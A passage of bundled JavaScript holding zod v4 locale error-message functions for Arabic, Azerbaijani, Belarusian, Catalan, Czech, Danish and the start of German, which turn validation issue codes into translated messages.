          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0628\u0640 "${issue3.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0646\u062A\u0647\u064A \u0628\u0640 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u062A\u0636\u0645\u0651\u064E\u0646 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u0646\u064E\u0635 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0637\u0627\u0628\u0642 \u0627\u0644\u0646\u0645\u0637 ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644`;
      }
      case "not_multiple_of":
        return `\u0631\u0642\u0645 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644: \u064A\u062C\u0628 \u0623\u0646 \u064A\u0643\u0648\u0646 \u0645\u0646 \u0645\u0636\u0627\u0639\u0641\u0627\u062A ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u0645\u0639\u0631\u0641${issue3.keys.length > 1 ? "\u0627\u062A" : ""} \u063A\u0631\u064A\u0628${issue3.keys.length > 1 ? "\u0629" : ""}: ${joinValues2(issue3.keys, "\u060C ")}`;
      case "invalid_key":
        return `\u0645\u0639\u0631\u0641 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue3.origin}`;
      case "invalid_union":
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
      case "invalid_element":
        return `\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644 \u0641\u064A ${issue3.origin}`;
      default:
        return "\u0645\u062F\u062E\u0644 \u063A\u064A\u0631 \u0645\u0642\u0628\u0648\u0644";
    }
  };
};
function ar_default2() {
  return {
    localeError: error48()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/az.js
var error49 = () => {
  const Sizable = {
    string: { unit: "simvol", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "element", verb: "olmal\u0131d\u0131r" },
    set: { unit: "element", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${issue3.expected}, daxil olan ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Yanl\u0131\u015F d\u0259y\u0259r: g\xF6zl\u0259nil\u0259n ${stringifyPrimitive2(issue3.values[0])}`;
        return `Yanl\u0131\u015F se\xE7im: a\u015Fa\u011F\u0131dak\u0131lardan biri olmal\u0131d\u0131r: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue3.origin ?? "d\u0259y\u0259r"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element"}`;
        return `\xC7ox b\xF6y\xFCk: g\xF6zl\u0259nil\u0259n ${issue3.origin ?? "d\u0259y\u0259r"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        return `\xC7ox ki\xE7ik: g\xF6zl\u0259nil\u0259n ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.prefix}" il\u0259 ba\u015Flamal\u0131d\u0131r`;
        if (_issue.format === "ends_with")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.suffix}" il\u0259 bitm\u0259lidir`;
        if (_issue.format === "includes")
          return `Yanl\u0131\u015F m\u0259tn: "${_issue.includes}" daxil olmal\u0131d\u0131r`;
        if (_issue.format === "regex")
          return `Yanl\u0131\u015F m\u0259tn: ${_issue.pattern} \u015Fablonuna uy\u011Fun olmal\u0131d\u0131r`;
        return `Yanl\u0131\u015F ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Yanl\u0131\u015F \u0259d\u0259d: ${issue3.divisor} il\u0259 b\xF6l\xFCn\u0259 bil\u0259n olmal\u0131d\u0131r`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan a\xE7ar${issue3.keys.length > 1 ? "lar" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} daxilind\u0259 yanl\u0131\u015F a\xE7ar`;
      case "invalid_union":
        return "Yanl\u0131\u015F d\u0259y\u0259r";
      case "invalid_element":
        return `${issue3.origin} daxilind\u0259 yanl\u0131\u015F d\u0259y\u0259r`;
      default:
        return `Yanl\u0131\u015F d\u0259y\u0259r`;
    }
  };
};
function az_default2() {
  return {
    localeError: error49()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/be.js
function getBelarusianPlural2(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error50 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0456\u043C\u0432\u0430\u043B",
        few: "\u0441\u0456\u043C\u0432\u0430\u043B\u044B",
        many: "\u0441\u0456\u043C\u0432\u0430\u043B\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u044B",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u044B",
        many: "\u0431\u0430\u0439\u0442\u0430\u045E"
      },
      verb: "\u043C\u0435\u0446\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u043B\u0456\u043A";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0456\u045E";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0443\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0430\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0456 \u0447\u0430\u0441",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0447\u0430\u0441",
    duration: "ISO \u043F\u0440\u0430\u0446\u044F\u0433\u043B\u0430\u0441\u0446\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0430\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0430\u0441",
    cidrv4: "IPv4 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u044B\u044F\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64",
    base64url: "\u0440\u0430\u0434\u043E\u043A \u0443 \u0444\u0430\u0440\u043C\u0430\u0446\u0435 base64url",
    json_string: "JSON \u0440\u0430\u0434\u043E\u043A",
    e164: "\u043D\u0443\u043C\u0430\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0443\u0432\u043E\u0434"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u045E\u0441\u044F ${issue3.expected}, \u0430\u0442\u0440\u044B\u043C\u0430\u043D\u0430 ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0432\u0430\u0440\u044B\u044F\u043D\u0442: \u0447\u0430\u043A\u0430\u045E\u0441\u044F \u0430\u0434\u0437\u0456\u043D \u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const maxValue = Number(issue3.maximum);
          const unit = getBelarusianPlural2(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue3.maximum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u0432\u044F\u043B\u0456\u043A\u0456: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435"} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const minValue = Number(issue3.minimum);
          const unit = getBelarusianPlural2(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 ${sizing.verb} ${adj}${issue3.minimum.toString()} ${unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u0430 \u043C\u0430\u043B\u044B: \u0447\u0430\u043A\u0430\u043B\u0430\u0441\u044F, \u0448\u0442\u043E ${issue3.origin} \u043F\u0430\u0432\u0456\u043D\u043D\u0430 \u0431\u044B\u0446\u044C ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u043F\u0430\u0447\u044B\u043D\u0430\u0446\u0446\u0430 \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u0430\u043A\u0430\u043D\u0447\u0432\u0430\u0446\u0446\u0430 \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0437\u043C\u044F\u0448\u0447\u0430\u0446\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u0440\u0430\u0434\u043E\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0430\u0434\u043F\u0430\u0432\u044F\u0434\u0430\u0446\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043B\u0456\u043A: \u043F\u0430\u0432\u0456\u043D\u0435\u043D \u0431\u044B\u0446\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u0430\u0437\u043D\u0430\u043D\u044B ${issue3.keys.length > 1 ? "\u043A\u043B\u044E\u0447\u044B" : "\u043A\u043B\u044E\u0447"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u043A\u043B\u044E\u0447 \u0443 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434";
      case "invalid_element":
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u0430\u0435 \u0437\u043D\u0430\u0447\u044D\u043D\u043D\u0435 \u045E ${issue3.origin}`;
      default:
        return `\u041D\u044F\u043F\u0440\u0430\u0432\u0456\u043B\u044C\u043D\u044B \u045E\u0432\u043E\u0434`;
    }
  };
};
function be_default2() {
  return {
    localeError: error50()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ca.js
var error51 = () => {
  const Sizable = {
    string: { unit: "car\xE0cters", verb: "contenir" },
    file: { unit: "bytes", verb: "contenir" },
    array: { unit: "elements", verb: "contenir" },
    set: { unit: "elements", verb: "contenir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entrada",
    email: "adre\xE7a electr\xF2nica",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "durada ISO",
    ipv4: "adre\xE7a IPv4",
    ipv6: "adre\xE7a IPv6",
    cidrv4: "rang IPv4",
    cidrv6: "rang IPv6",
    base64: "cadena codificada en base64",
    base64url: "cadena codificada en base64url",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Tipus inv\xE0lid: s'esperava ${issue3.expected}, s'ha rebut ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Valor inv\xE0lid: s'esperava ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opci\xF3 inv\xE0lida: s'esperava una de ${joinValues2(issue3.values, " o ")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "com a m\xE0xim" : "menys de";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Massa gran: s'esperava que ${issue3.origin ?? "el valor"} contingu\xE9s ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Massa gran: s'esperava que ${issue3.origin ?? "el valor"} fos ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "com a m\xEDnim" : "m\xE9s de";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Massa petit: s'esperava que ${issue3.origin} contingu\xE9s ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Massa petit: s'esperava que ${issue3.origin} fos ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Format inv\xE0lid: ha de comen\xE7ar amb "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Format inv\xE0lid: ha d'acabar amb "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Format inv\xE0lid: ha d'incloure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Format inv\xE0lid: ha de coincidir amb el patr\xF3 ${_issue.pattern}`;
        return `Format inv\xE0lid per a ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE0lid: ha de ser m\xFAltiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Clau${issue3.keys.length > 1 ? "s" : ""} no reconeguda${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Clau inv\xE0lida a ${issue3.origin}`;
      case "invalid_union":
        return "Entrada inv\xE0lida";
      case "invalid_element":
        return `Element inv\xE0lid a ${issue3.origin}`;
      default:
        return `Entrada inv\xE0lida`;
    }
  };
};
function ca_default2() {
  return {
    localeError: error51()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/cs.js
var error52 = () => {
  const Sizable = {
    string: { unit: "znak\u016F", verb: "m\xEDt" },
    file: { unit: "bajt\u016F", verb: "m\xEDt" },
    array: { unit: "prvk\u016F", verb: "m\xEDt" },
    set: { unit: "prvk\u016F", verb: "m\xEDt" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u010D\xEDslo";
      }
      case "string": {
        return "\u0159et\u011Bzec";
      }
      case "boolean": {
        return "boolean";
      }
      case "bigint": {
        return "bigint";
      }
      case "function": {
        return "funkce";
      }
      case "symbol": {
        return "symbol";
      }
      case "undefined": {
        return "undefined";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "pole";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "regul\xE1rn\xED v\xFDraz",
    email: "e-mailov\xE1 adresa",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "datum a \u010Das ve form\xE1tu ISO",
    date: "datum ve form\xE1tu ISO",
    time: "\u010Das ve form\xE1tu ISO",
    duration: "doba trv\xE1n\xED ISO",
    ipv4: "IPv4 adresa",
    ipv6: "IPv6 adresa",
    cidrv4: "rozsah IPv4",
    cidrv6: "rozsah IPv6",
    base64: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64",
    base64url: "\u0159et\u011Bzec zak\xF3dovan\xFD ve form\xE1tu base64url",
    json_string: "\u0159et\u011Bzec ve form\xE1tu JSON",
    e164: "\u010D\xEDslo E.164",
    jwt: "JWT",
    template_literal: "vstup"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${issue3.expected}, obdr\u017Eeno ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Neplatn\xFD vstup: o\u010Dek\xE1v\xE1no ${stringifyPrimitive2(issue3.values[0])}`;
        return `Neplatn\xE1 mo\u017Enost: o\u010Dek\xE1v\xE1na jedna z hodnot ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue3.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 velk\xE1: ${issue3.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue3.origin ?? "hodnota"} mus\xED m\xEDt ${adj}${issue3.minimum.toString()} ${sizing.unit ?? "prvk\u016F"}`;
        }
        return `Hodnota je p\u0159\xEDli\u0161 mal\xE1: ${issue3.origin ?? "hodnota"} mus\xED b\xFDt ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED za\u010D\xEDnat na "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED kon\u010Dit na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED obsahovat "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neplatn\xFD \u0159et\u011Bzec: mus\xED odpov\xEDdat vzoru ${_issue.pattern}`;
        return `Neplatn\xFD form\xE1t ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Neplatn\xE9 \u010D\xEDslo: mus\xED b\xFDt n\xE1sobkem ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nezn\xE1m\xE9 kl\xED\u010De: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Neplatn\xFD kl\xED\u010D v ${issue3.origin}`;
      case "invalid_union":
        return "Neplatn\xFD vstup";
      case "invalid_element":
        return `Neplatn\xE1 hodnota v ${issue3.origin}`;
      default:
        return `Neplatn\xFD vstup`;
    }
  };
};
function cs_default2() {
  return {
    localeError: error52()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/da.js
var error53 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "havde" },
    file: { unit: "bytes", verb: "havde" },
    array: { unit: "elementer", verb: "indeholdt" },
    set: { unit: "elementer", verb: "indeholdt" }
  };
  const TypeNames = {
    string: "streng",
    number: "tal",
    boolean: "boolean",
    array: "liste",
    object: "objekt",
    set: "s\xE6t",
    file: "fil"
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  function getTypeName(type) {
    return TypeNames[type] ?? type;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "tal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "liste";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
        return "objekt";
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "e-mailadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkesl\xE6t",
    date: "ISO-dato",
    time: "ISO-klokkesl\xE6t",
    duration: "ISO-varighed",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodet streng",
    base64url: "base64url-kodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ugyldigt input: forventede ${getTypeName(issue3.expected)}, fik ${getTypeName(parsedType2(issue3.input))}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ugyldig v\xE6rdi: forventede ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ugyldigt valg: forventede en af f\xF8lgende ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing)
          return `For stor: forventede ${origin ?? "value"} ${sizing.verb} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor: forventede ${origin ?? "value"} havde ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing) {
          return `For lille: forventede ${origin} ${sizing.verb} ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `For lille: forventede ${origin} havde ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: skal starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: skal ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: skal indeholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: skal matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ugyldigt tal: skal v\xE6re deleligt med ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ukendte n\xF8gler" : "Ukendt n\xF8gle"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8gle i ${issue3.origin}`;
      case "invalid_union":
        return "Ugyldigt input: matcher ingen af de tilladte typer";
      case "invalid_element":
        return `Ugyldig v\xE6rdi i ${issue3.origin}`;
      default:
        return `Ugyldigt input`;
    }
  };
};
function da_default2() {
  return {
    localeError: error53()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/de.js
var error54 = () => {
  const Sizable = {
    string: { unit: "Zeichen", verb: "zu haben" },
    file: { unit: "Bytes", verb: "zu haben" },
    array: { unit: "Elemente", verb: "zu haben" },
    set: { unit: "Elemente", verb: "zu haben" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType2 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "Zahl";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "Array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "Eingabe",
    email: "E-Mail-Adresse",
